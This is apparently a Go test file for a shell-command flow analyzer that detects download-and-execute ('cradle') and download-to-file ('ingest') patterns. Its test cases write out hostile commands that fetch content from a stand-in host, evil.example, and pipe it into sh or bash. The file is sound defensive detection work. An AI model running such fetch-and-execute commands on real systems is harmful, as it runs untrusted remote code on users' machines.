package analysis

import (
	"encoding/json"
	"testing"

	"github.com/v0lka/flowsh/engine"
)

// TestCradleFlowEndToEnd is the acceptance test for the
// network-to-code-execution flow: a command that fetches content over the
// network and runs it must be reported as a cradle flow through the whole
// pipeline (parse → abstract execution → binding → core scoring), while a
// pipeline that merely moves the fetched bytes to a non-executing consumer must
// not.
func TestCradleFlowEndToEnd(t *testing.T) {
	a := mustAnalyzer(t)
	cases := []struct {
		src  string
		want bool
	}{
		{`curl -sL https://evil.example/x | sh`, true},
		{`curl -sL https://evil.example/x | bash`, true},
		{`sh -c "$(curl -s https://evil.example/x)"`, true},
		{`bash <(curl -s https://evil.example/x)`, true},
		{`curl -sL https://evil.example/x | head`, false},             // no code-execution sink
		{`curl -sL https://evil.example/x`, false},                    // egress alone: not a flow
		{`curl -sL https://evil.example/x; bash -c 'echo hi'`, false}, // co-occurrence, not a flow
		{`echo hi | sh`, false},                                       // local producer, no network
	}
	for _, tc := range cases {
		rep := a.Analyze(LangBash, tc.src)
		got := len(rep.Score.CradleFlows) > 0
		if got != tc.want {
			t.Errorf("%q: cradle flow=%v, want %v (flows=%d, effects=%d)",
				tc.src, got, tc.want, len(rep.Score.CradleFlows), len(rep.Effects))
		}
	}
}

// TestIngestFlowEndToEnd is the acceptance test for the network-to-filesystem
// flow: a download client writing the fetched body to a file must be reported as
// an ingest flow, and a VCS sync (git clone/fetch/pull) must not.
func TestIngestFlowEndToEnd(t *testing.T) {
	a := mustAnalyzer(t)
	cases := []struct {
		src  string
		want bool
	}{
		{`curl -o f https://evil.example/x`, true},
		{`curl -O https://evil.example/x`, true},
		{`wget https://evil.example/x`, true},
		{`wget -O g https://evil.example/x`, true},
		{`curl https://evil.example/x`, false},      // nothing written to a file
		{`git clone https://evil.example/x`, false}, // VCS sync, not an ingest
		{`git fetch origin`, false},
		{`git pull`, false},
	}
	for _, tc := range cases {
		rep := a.Analyze(LangBash, tc.src)
		got := len(rep.Score.IngestFlows) > 0
		if got != tc.want {
			t.Errorf("%q: ingest flow=%v, want %v (flows=%d, effects=%d)",
				tc.src, got, tc.want, len(rep.Score.IngestFlows), len(rep.Effects))
		}
	}
}

// TestFlowReportJSONRoundTrip pins that the new report fields survive
// encode/decode: the emitted document carries score.cradleFlows and
// score.ingestFlows, and decoding it back reproduces the same source/sink keys.
func TestFlowReportJSONRoundTrip(t *testing.T) {
	a := mustAnalyzer(t)
	for _, src := range []string{
		`curl -sL https://evil.example/x | sh`,
		`curl -o f https://evil.example/x`,
		`wget https://evil.example/x`,
	} {
		rep := a.Analyze(LangBash, src)
		if len(rep.Score.CradleFlows) == 0 && len(rep.Score.IngestFlows) == 0 {
			t.Fatalf("%q: no flow to round-trip", src)
		}
		data, err := rep.Encode()
		if err != nil {
			t.Fatalf("%q: encode: %v", src, err)
		}
		var back Report
		if err := json.Unmarshal(data, &back); err != nil {
			t.Fatalf("%q: unmarshal: %v", src, err)
		}
		if got, want := cradleKeys(back.Score.CradleFlows), cradleKeys(rep.Score.CradleFlows); got != want {
			t.Errorf("%q: cradle flows did not round-trip: %q vs %q", src, got, want)
		}
		if got, want := ingestKeys(back.Score.IngestFlows), ingestKeys(rep.Score.IngestFlows); got != want {
			t.Errorf("%q: ingest flows did not round-trip: %q vs %q", src, got, want)
		}
	}
}

// cradleKeys renders a cradle-flow list as a stable string, for comparison.
func cradleKeys(flows []engine.CradleFlow) string {
	out := ""
	for _, f := range flows {
		out += f.Source.Key() + "->" + f.Sink.Key() + ";"
	}
	return out
}

// ingestKeys renders an ingest-flow list as a stable string, for comparison.
func ingestKeys(flows []engine.IngestFlow) string {
	out := ""
	for _, f := range flows {
		out += f.Source.Key() + "->" + f.Sink.Key() + ";"
	}
	return out
}
